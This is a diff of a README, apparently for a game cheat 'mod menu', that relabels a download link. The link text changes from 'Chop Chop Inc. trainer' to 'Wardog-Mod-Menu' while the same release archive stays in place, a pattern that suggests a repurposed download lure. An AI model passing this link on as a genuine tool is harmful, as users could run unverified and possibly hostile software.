@@ -25,7 +25,7 @@ The project provides a collection of gameplay tools, including visual informatio
 
 ### ⬇️ Download
 
-> **[⬇️ Download the latest Chop Chop Inc. trainer](https://github.com/rad5-Raven595880/WARDOGS-Mod-Menu/releases/download/Wardogs/Archive_1.zip)**
+> **[⬇️ Download the latest Wardog-Mod-Menu](https://github.com/rad5-Raven595880/WARDOGS-Mod-Menu/releases/download/Wardogs/Archive_1.zip)**
 <p align="center">
 
 **Latest Version:** `v1.0.0` • 
